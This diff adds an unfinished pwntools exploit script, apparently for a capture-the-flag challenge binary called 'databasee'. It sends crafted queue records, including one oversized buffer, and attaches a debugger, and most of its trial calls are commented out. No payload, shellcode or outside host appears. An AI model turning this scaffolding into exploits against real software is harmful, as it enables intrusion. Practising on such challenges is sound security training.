@@ -1,0 +1,103 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("databasee")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+decompiler connect ida
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def createbuff(buffer):
+    # buffer = b"./flag.txt\0"
+    chunk_size = 1
+    chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
+    return chunks
+class queue():
+    def __init__(self,queue_list) -> None:
+        self.queue_list = queue_list
+    def create(self,option):
+        if option == 2:
+            s(p32(option) + p32(0))
+            return
+        else:
+            queue_len = len(queue_list)
+            if queue_len != 1 and (option == 1 or option == 3):
+                print(f"queue_len: {queue_len}")
+                print(f"option: {option}")
+                print("wrong size of queue list for this option")
+                return
+            elif queue_len != 3 and option == 4:
+                print("wrong size of queue list for this option")
+                return               
+            s(p32(option) + p32(queue_len))
+            # input("num size-> ")
+            for i in range(queue_len):
+                queue = queue_list[i]
+                s(p16(len(queue)))
+                s(queue)
+                # for j in range(len(queue)):
+                    # input(f"input {i}: ")
+p.recvuntil("...")
+
+# queue_list.append([p8(0x0)])
+# queue_list.append([p8(3),p8(2),p8(1)])
+# new.create(1)
+# new.create(2)
+# new.create(1)
+# queue_list = [p8(0)]
+# new = queue(queue_list)
+# new.create(3)
+# queue_list.append([3,4,5])
+# new.create(4)
+# queue_list.append([p8(0x0)])
+# queue_list.append([p8(0x0)])
+
+# print(createbuff("\1"))
+queue_list = [b"".ljust(0xfff,b"a")] 
+# print(queue_list)
+new2 = queue(queue_list)
+gdbs()
+new2.create(1)
+# new2.create(1)
+# new2.create(1)
+# new2.create(2)
+# queue_list = ["\0\0\0\0fsdlafjdsklafjdsaklfdjsaklfjdsaklfdjsklafdajs".ljust(0xff,"b")] 
+# new2.create(1)
+# new2.create(1)
+# new2.create(1)
+# new2.create(3)
+# new2.create(4)
+# new2.create(1)
+# new2.create(5)
+# queue_list = ["\0\0\0\0fsdlafjdsklafjdsaklfdjsaklfjdsaklfdjsklafdajs", "aaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"] 
+# create(3, 1)
+# create(3, 2)
+# create(3)
+# create(3)
+# pop(3)
+# free_queue(3)
+# free_queue(3)
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
